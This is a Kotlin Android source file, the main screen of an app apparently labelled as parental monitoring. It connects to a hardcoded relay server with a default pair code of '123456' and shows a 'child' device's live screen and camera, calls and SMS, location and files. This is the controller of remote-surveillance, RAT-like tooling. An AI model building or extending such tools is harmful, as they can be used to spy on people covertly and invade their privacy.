package com.parent.monitor

import android.content.SharedPreferences
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.Fragment
import androidx.viewpager2.adapter.FragmentStateAdapter
import androidx.viewpager2.widget.ViewPager2
import com.google.android.material.tabs.TabLayout
import com.google.android.material.tabs.TabLayoutMediator
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    companion object {
        const val PREFS_NAME       = "config"
        const val KEY_SERVER_URL   = "server_url"
        const val KEY_PAIR_CODE    = "pair_code"
        const val KEY_GITHUB_REPO  = "github_repo"
        const val DEFAULT_URL      = "wss://bhai-secret--bs5129628.replit.app/api/ws"
    }

    // ─── Fragment refs ────────────────────────────────────────────────────────
    var dashboardFragment: DashboardFragment? = null
    var liveFragment:      LiveFragment?      = null

    // ─── Views ───────────────────────────────────────────────────────────────
    private lateinit var tvStatus:   TextView
    private lateinit var tvBattery:  TextView
    private lateinit var tvPing:     TextView
    private lateinit var btnNetToggle: Button

    // ─── WebSocket ───────────────────────────────────────────────────────────
    private var ws:     WebSocket?    = null
    private var client: OkHttpClient? = null
    private val handler = Handler(Looper.getMainLooper())
    private var reconnectRunnable: Runnable? = null
    private var pingInterval:      Runnable? = null
    private var connected = false
    private var pingTs    = 0L

    // ─── Prefs ───────────────────────────────────────────────────────────────
    private lateinit var prefs: SharedPreferences
    private var serverUrl = DEFAULT_URL
    private var pairCode  = "123456"
    private var netEnabled = true

    // Backward-compat shim — fragments call act.wsManager?.sendCommand(...)
    inner class WsCompat {
        fun sendCommand(cmd: String) = this@MainActivity.sendCommand(cmd)
        fun sendCommandObj(data: org.json.JSONObject) = this@MainActivity.sendCommandObj(data)
        fun isConnected() = connected
    }
    val wsManager = WsCompat()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        prefs     = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        serverUrl = prefs.getString(KEY_SERVER_URL, DEFAULT_URL) ?: DEFAULT_URL
        pairCode  = prefs.getString(KEY_PAIR_CODE,  pairCode)    ?: pairCode

        bindViews()
        setupViewPager()
        setupNetToggle()
        connect()
    }

    private fun bindViews() {
        tvStatus     = findViewById(R.id.tvStatus)
        tvBattery    = findViewById(R.id.tvBattery)
        tvPing       = findViewById(R.id.tvPing)
        btnNetToggle = findViewById(R.id.btnNetToggle)
    }

    private fun setupViewPager() {
        val pager = findViewById<ViewPager2>(R.id.viewPager)
        val tabs  = findViewById<TabLayout>(R.id.tabLayout)
        val tabTitles = listOf("Dashboard","Live","Apps","Calls & SMS","Location","Files","Controls","Shizuku","Settings")

        pager.adapter = object : FragmentStateAdapter(this) {
            override fun getItemCount() = tabTitles.size
            override fun createFragment(pos: Int): Fragment = when (pos) {
                0 -> DashboardFragment()
                1 -> LiveFragment()
                2 -> AppsFragment()
                3 -> CallSmsFragment()
                4 -> LocationFragment()
                5 -> FilesFragment()
                6 -> ControlFragment()
                7 -> ShizukuFragment()
                8 -> SettingsFragment()
                else -> DashboardFragment()
            }
        }
        pager.offscreenPageLimit = 2
        TabLayoutMediator(tabs, pager) { tab, pos -> tab.text = tabTitles[pos] }.attach()
    }

    private fun setupNetToggle() {
        btnNetToggle.setOnClickListener {
            netEnabled = !netEnabled
            val cmd = if (netEnabled) "wifi_on" else "wifi_off"
            sendCommand(cmd)
            btnNetToggle.text = if (netEnabled) "NET" else "NET✕"
            btnNetToggle.setBackgroundColor(if (netEnabled) 0xFF00E5FF.toInt() else 0xFFFF1744.toInt())
        }
    }

    // ─── WebSocket ────────────────────────────────────────────────────────────

    fun connect() {
        if (client == null) {
            client = OkHttpClient.Builder()
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .pingInterval(20, TimeUnit.SECONDS)
                .build()
        }
        try {
            val req = Request.Builder().url(serverUrl).build()
            ws = client!!.newWebSocket(req, object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, res: Response) {
                    ws.send(JSONObject().apply {
                        put("type", "register")
                        put("role", "parent")
                        put("pair_code", pairCode)
                    }.toString())
                }
                override fun onMessage(ws: WebSocket, text: String) {
                    try { handleMessage(JSONObject(text)) } catch (_: Exception) {}
                }
                override fun onClosing(ws: WebSocket, code: Int, reason: String) { setConnected(false) }
                override fun onClosed(ws: WebSocket, code: Int, reason: String)  { setConnected(false); scheduleReconnect() }
                override fun onFailure(ws: WebSocket, t: Throwable, res: Response?) { setConnected(false); scheduleReconnect() }
            })
        } catch (_: Exception) { scheduleReconnect() }
    }

    fun reconnect(newUrl: String, newCode: String) {
        serverUrl = newUrl; pairCode = newCode
        ws?.close(1000, null); ws = null
        reconnectRunnable?.let { handler.removeCallbacks(it) }
        connect()
    }

    private fun handleMessage(msg: JSONObject) {
        when (msg.optString("type")) {
            "auth_ok"          -> { }
            "peer_connected"   -> setConnected(true)
            "peer_disconnected"-> setConnected(false)
            "pong" -> {
                val ms = System.currentTimeMillis() - pingTs
                handler.post {
                    tvPing.text = "${ms}ms"
                    dashboardFragment?.updatePing(ms)
                }
            }
            "screen_frame" -> liveFragment?.onScreenFrame(msg.optString("frame"))
            "camera_frame" -> liveFragment?.onCameraFrame(msg.optString("frame"))
            "battery" -> {
                val pct = msg.optInt("battery", -1)
                val chg = msg.optBoolean("charging", false)
                handler.post {
                    tvBattery.text = "${pct}%${if (chg) "⚡" else ""}"
                    dashboardFragment?.updateBattery(pct, chg)
                }
            }
            "location" -> {
                val lat = msg.optDouble("lat"); val lng = msg.optDouble("lng")
                handler.post { dashboardFragment?.updateLocation(lat, lng) }
            }
            "current_app" -> {
                val pkg = msg.optString("package")
                handler.post { dashboardFragment?.updateCurrentApp(pkg) }
            }
            "update_result" -> {
                val ok  = msg.optBoolean("success")
                val ver = msg.optString("version", "")
                val err = msg.optString("error", "")
                handler.post {
                    dashboardFragment?.addLog(
                        if (ok) "🔄 Child updated to $ver successfully!"
                        else    "❌ Update failed: $err"
                    )
                }
            }
        }
    }

    private fun setConnected(on: Boolean) {
        connected = on
        handler.post {
            tvStatus.text = if (on) "Online" else "Offline"
            tvStatus.setTextColor(if (on) 0xFF00C853.toInt() else 0xFFF44336.toInt())
            dashboardFragment?.updateOnline(on)
            if (on) startPinging() else stopPinging()
        }
    }

    private fun scheduleReconnect() {
        reconnectRunnable?.let { handler.removeCallbacks(it) }
        reconnectRunnable = Runnable { if (!connected) connect() }
        handler.postDelayed(reconnectRunnable!!, 5000)
    }

    private fun startPinging() {
        stopPinging()
        pingInterval = object : Runnable {
            override fun run() {
                if (connected) {
                    pingTs = System.currentTimeMillis()
                    sendToChild(JSONObject().apply { put("type", "ping") })
                    handler.postDelayed(this, 5000)
                }
            }
        }
        handler.postDelayed(pingInterval!!, 5000)
    }

    private fun stopPinging() {
        pingInterval?.let { handler.removeCallbacks(it) }
    }

    // ─── Public send helpers (used by all fragments) ──────────────────────────

    fun sendToChild(data: JSONObject) {
        try { ws?.send(data.toString()) } catch (_: Exception) {}
    }

    fun sendCommand(command: String) {
        sendToChild(JSONObject().apply { put("command", command) })
    }

    fun sendCommandObj(data: JSONObject) {
        sendToChild(data)
    }

    override fun onDestroy() {
        stopPinging()
        reconnectRunnable?.let { handler.removeCallbacks(it) }
        ws?.close(1000, null)
        super.onDestroy()
    }
}
